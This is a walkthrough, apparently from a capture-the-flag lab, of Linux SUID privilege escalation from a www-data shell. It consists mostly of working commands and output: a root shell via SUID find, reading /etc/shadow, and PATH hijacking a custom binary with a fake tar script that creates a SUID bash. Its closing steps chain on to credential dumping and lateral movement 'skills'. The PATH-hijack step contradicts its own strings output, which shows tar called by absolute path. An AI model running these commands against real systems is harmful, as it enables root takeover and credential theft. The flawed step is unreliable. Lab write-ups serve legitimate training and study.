# Linux SUID Binary Privilege Escalation

## Scenario
Shell as `www-data` on Linux, hunting for SUID escalation paths.

## Step 1: Find SUID Binaries
```bash
www-data@target:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/find              # <-- INTERESTING
/usr/local/bin/backup_util  # <-- CUSTOM BINARY
/snap/snapd/19457/usr/lib/snapd/snap-confine
```

## Step 2: Check GTFOBins for /usr/bin/find
```bash
# find with SUID can spawn a shell as root
www-data@target:~$ ls -la /usr/bin/find
-rwsr-xr-x 1 root root 320160 Jan 10 2024 /usr/bin/find

www-data@target:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
# whoami
root
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

## Step 3: Verify Root Access
```bash
# cat /etc/shadow | head -3
root:$6$xyz123$abcdefghijklmno...:19500:0:99999:7:::
daemon:*:19389:0:99999:7:::
bin:*:19389:0:99999:7:::

# cat /root/root.txt
flag{pr1v3sc_v14_su1d_f1nd}

# ip a | grep inet
    inet 127.0.0.1/8 scope host lo
    inet 10.10.10.75/24 brd 10.10.10.255 scope global eth0
```

## Step 4: Investigate Custom SUID Binary
```bash
# The custom binary is also worth investigating
www-data@target:~$ strings /usr/local/bin/backup_util | grep -i "system\|exec\|popen\|/bin"
/bin/tar
system
Creating backup...
/bin/tar czf /tmp/backup.tar.gz /var/www/html

# This binary calls /bin/tar without absolute path in some code paths
# Could exploit via PATH hijacking
www-data@target:~$ echo '#!/bin/bash' > /tmp/tar
www-data@target:~$ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/tar
www-data@target:~$ chmod +x /tmp/tar
www-data@target:~$ export PATH=/tmp:$PATH
www-data@target:~$ /usr/local/bin/backup_util
Creating backup...
www-data@target:~$ ls -la /tmp/rootbash
-rwsr-sr-x 1 root root 1183448 Jan 15 17:30 /tmp/rootbash
www-data@target:~$ /tmp/rootbash -p
rootbash-5.1# whoami
root
```

## Evidence
- `/usr/bin/find` has SUID bit set → instant root via `-exec`
- `/usr/local/bin/backup_util` custom SUID binary → PATH hijacking to root
- Two independent privesc paths confirmed

## Next Steps
→ **credential_access skill**: Dump /etc/shadow, SSH keys, config files
→ **discovery skill**: Full internal enumeration as root
→ **lateral_movement skill**: Use found credentials to pivot
